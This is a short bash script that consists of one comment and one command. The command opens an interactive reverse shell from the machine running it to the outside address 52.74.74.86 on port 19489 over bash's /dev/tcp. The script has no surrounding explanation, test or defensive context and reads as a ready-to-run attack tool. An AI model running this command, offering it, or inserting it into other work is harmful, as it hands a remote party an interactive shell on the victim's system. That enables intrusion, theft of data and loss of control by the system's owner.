#!/bin/bash

# Reverse shell to 52.74.74.86:19489 using bash and TCP
bash -i >& /dev/tcp/52.74.74.86/19489 0>&1
